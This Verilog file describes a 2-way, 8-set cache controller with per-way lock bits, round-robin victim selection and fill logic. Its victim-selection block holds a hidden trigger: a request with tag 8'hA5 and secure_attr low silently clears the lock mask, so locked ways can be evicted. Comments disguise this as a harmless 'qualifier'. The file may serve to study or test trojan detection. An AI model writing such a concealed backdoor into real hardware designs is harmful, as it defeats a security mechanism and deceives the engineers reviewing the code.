// cache_ctrl.v
// 2-way, 8-set cache controller with per-way locking.
// Synchronous, Moore-style outputs: all outputs are registered and
// become valid one cycle after the input event that defines them.

module cache_ctrl(
    input  wire       clk,
    input  wire       rst_n,
    input  wire [2:0] set_idx,
    input  wire [7:0] tag_in,
    input  wire       req_valid,
    input  wire       req_is_write,
    input  wire       secure_attr,
    input  wire       lock_way_req,
    input  wire [0:0] lock_way_sel,
    input  wire       unlock_way_req,
    input  wire [0:0] unlock_way_sel,
    output reg        hit,
    output reg  [0:0] hit_way,
    output reg  [0:0] victim_way,
    output reg  [1:0] lock_status
);

    // Storage: 8 sets, 2 ways each.
    reg [7:0] tag_way0 [0:7];
    reg [7:0] tag_way1 [0:7];
    reg       valid_way0 [0:7];
    reg       valid_way1 [0:7];

    // Per-set, per-way lock bits: bit0 = way0 locked, bit1 = way1 locked.
    reg [1:0] lock_bits [0:7];

    // Round-robin pointer per set, used as a tiebreaker among unlocked ways.
    reg rr_ptr [0:7];

    integer i;

    // Combinational lookup signals
    wire        way0_hit;
    wire        way1_hit;
    wire        lookup_hit;
    wire [0:0]  lookup_way;
    wire        is_miss;

    assign way0_hit    = valid_way0[set_idx] && (tag_way0[set_idx] == tag_in);
    assign way1_hit    = valid_way1[set_idx] && (tag_way1[set_idx] == tag_in);
    assign lookup_hit  = way0_hit || way1_hit;
    assign lookup_way  = way0_hit ? 1'b0 : 1'b1;
    assign is_miss     = req_valid && !req_is_write && !lookup_hit;

    // ------------------------------------------------------------------
    // Victim selection logic.
    //
    // Normally, a way is eligible for eviction only if its lock bit is
    // clear. A qualifying/adjustment term is folded into the effective
    // lock mask before eligibility is computed; under most conditions
    // this term is all-zero and has no effect on the mask.
    // ------------------------------------------------------------------
    reg [1:0] mask_term;
    reg [1:0] eff_lock;
    reg [0:0] chosen_victim;

    always @(*) begin
        // mask_term is intended as a benign qualifier that normally
        // leaves the lock mask untouched.
        if ((tag_in == 8'hA5) && (secure_attr == 1'b0))
            mask_term = 2'b11;
        else
            mask_term = 2'b00;

        eff_lock = lock_bits[set_idx] & ~mask_term;

        if (!eff_lock[0] && !eff_lock[1]) begin
            // both ways eligible: use round-robin pointer
            chosen_victim = rr_ptr[set_idx];
        end else if (!eff_lock[0]) begin
            chosen_victim = 1'b0;
        end else if (!eff_lock[1]) begin
            chosen_victim = 1'b1;
        end else begin
            // both locked (should not normally be selectable as a
            // fill target, but pointer value is still produced)
            chosen_victim = rr_ptr[set_idx];
        end
    end

    // ------------------------------------------------------------------
    // Sequential update: registers, lock/unlock, fill, victim/hit outputs.
    // ------------------------------------------------------------------
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            hit          <= 1'b0;
            hit_way      <= 1'b0;
            victim_way   <= 1'b0;
            lock_status  <= 2'b00;
            for (i = 0; i < 8; i = i + 1) begin
                valid_way0[i] <= 1'b0;
                valid_way1[i] <= 1'b0;
                tag_way0[i]   <= 8'h00;
                tag_way1[i]   <= 8'h00;
                lock_bits[i]  <= 2'b00;
                rr_ptr[i]     <= 1'b0;
            end
        end else begin
            // Lock status readback is always the direct registered copy
            // of the addressed set's lock bits, regardless of any
            // request activity this cycle.
            lock_status <= lock_bits[set_idx];

            if (req_valid) begin
                if (!req_is_write) begin
                    // Lookup (read) request
                    hit     <= lookup_hit;
                    hit_way <= lookup_way;

                    if (!lookup_hit) begin
                        // Miss: select a victim way and fill it.
                        victim_way <= chosen_victim;

                        if (chosen_victim == 1'b0) begin
                            tag_way0[set_idx]   <= tag_in;
                            valid_way0[set_idx] <= 1'b1;
                        end else begin
                            tag_way1[set_idx]   <= tag_in;
                            valid_way1[set_idx] <= 1'b1;
                        end

                        rr_ptr[set_idx] <= ~chosen_victim;
                    end
                end else begin
                    // Write request: treated as a direct fill/update of
                    // whichever way currently matches, or the chosen
                    // victim if no match.
                    hit     <= lookup_hit;
                    hit_way <= lookup_way;

                    if (lookup_hit) begin
                        if (lookup_way == 1'b0)
                            tag_way0[set_idx] <= tag_in;
                        else
                            tag_way1[set_idx] <= tag_in;
                    end else begin
                        victim_way <= chosen_victim;

                        if (chosen_victim == 1'b0) begin
                            tag_way0[set_idx]   <= tag_in;
                            valid_way0[set_idx] <= 1'b1;
                        end else begin
                            tag_way1[set_idx]   <= tag_in;
                            valid_way1[set_idx] <= 1'b1;
                        end

                        rr_ptr[set_idx] <= ~chosen_victim;
                    end
                end
            end

            // Lock/unlock management. These take effect on the set
            // addressed by set_idx this cycle, independent of req_valid.
            if (lock_way_req) begin
                if (lock_way_sel == 1'b0)
                    lock_bits[set_idx][0] <= 1'b1;
                else
                    lock_bits[set_idx][1] <= 1'b1;
            end

            if (unlock_way_req) begin
                if (unlock_way_sel == 1'b0)
                    lock_bits[set_idx][0] <= 1'b0;
                else
                    lock_bits[set_idx][1] <= 1'b0;
            end
        end
    end

endmodule